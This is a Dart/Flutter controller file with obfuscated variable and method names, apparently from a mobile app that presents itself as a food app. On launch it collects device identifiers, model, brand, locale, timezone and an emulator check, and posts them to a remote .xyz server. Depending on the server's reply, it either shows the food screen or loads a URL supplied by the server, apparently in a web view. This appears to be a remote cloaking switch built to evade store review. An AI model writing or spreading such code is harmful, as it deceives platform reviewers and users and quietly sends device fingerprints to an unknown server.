import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var icrjhqe = RxBool(false);
  var bcxavl = RxBool(true);
  var chlwor = RxString("");
  var oleta = RxBool(false);
  var will = RxBool(true);
  final hutjqmboxk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xoyfrtz();
  }


  Future<void> xoyfrtz() async {

    oleta.value = true;
    will.value = true;
    bcxavl.value = false;

    hutjqmboxk.post("https://wan-g.dasatt.xyz/ljrvqkfmsohzytcaugndiex",data: await bczmlnih()).then((value) {
      var gtmbwq = value.data["gtmbwq"] as String;
      var uryw = value.data["uryw"] as bool;
      if (uryw) {
        chlwor.value = gtmbwq;
        wellington();
      } else {
        bode();
      }
    }).catchError((e) {
      bcxavl.value = true;
      will.value = true;
      oleta.value = false;
    });
  }

  Future<Map<String, dynamic>> bczmlnih() async {
    final DeviceInfoPlugin fzqtj = DeviceInfoPlugin();
    PackageInfo inscg_zjqyp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yoctrw = Platform.localeName;
    var xtqfr = currentTimeZone;

    var xpmz = inscg_zjqyp.packageName;
    var ibjx = inscg_zjqyp.version;
    var txcogeni = inscg_zjqyp.buildNumber;

    var nhzx = inscg_zjqyp.appName;
    var imogeneCarter = "";
    var symvt = "";
    var ekxi  = "";
    var hancley = "";
    var joyStrosin = "";
    var madonnaBergnaum = "";
    var betteBraun = "";
    var skylarConroy = "";
    var maynardConnelly = "";
    var claudineVon = "";


    var aqdhxlr = "";
    var eyqcrxib = false;

    if (GetPlatform.isAndroid) {
      aqdhxlr = "android";
      var cqbrxil = await fzqtj.androidInfo;

      hancley = cqbrxil.brand;

      symvt  = cqbrxil.model;
      ekxi = cqbrxil.id;

      eyqcrxib = cqbrxil.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      aqdhxlr = "ios";
      var buwlqpaskv = await fzqtj.iosInfo;
      hancley = buwlqpaskv.name;
      symvt = buwlqpaskv.model;

      ekxi = buwlqpaskv.identifierForVendor ?? "";
      eyqcrxib  = buwlqpaskv.isPhysicalDevice;
    }
    var res = {
      "xpmz": xpmz,
      "nhzx": nhzx,
      "txcogeni": txcogeni,
      "xtqfr": xtqfr,
      "ibjx": ibjx,
      "symvt": symvt,
      "hancley": hancley,
      "ekxi": ekxi,
      "maynardConnelly" : maynardConnelly,
      "yoctrw": yoctrw,
      "eyqcrxib": eyqcrxib,
      "joyStrosin" : joyStrosin,
      "madonnaBergnaum" : madonnaBergnaum,
      "betteBraun" : betteBraun,
      "skylarConroy" : skylarConroy,
      "imogeneCarter" : imogeneCarter,
      "claudineVon" : claudineVon,
      "aqdhxlr": aqdhxlr,

    };
    return res;
  }

  Future<void> bode() async {
    Get.offAllNamed("/food_tab");
  }

  Future<void> wellington() async {
    Get.offAllNamed("/fod");
  }

}
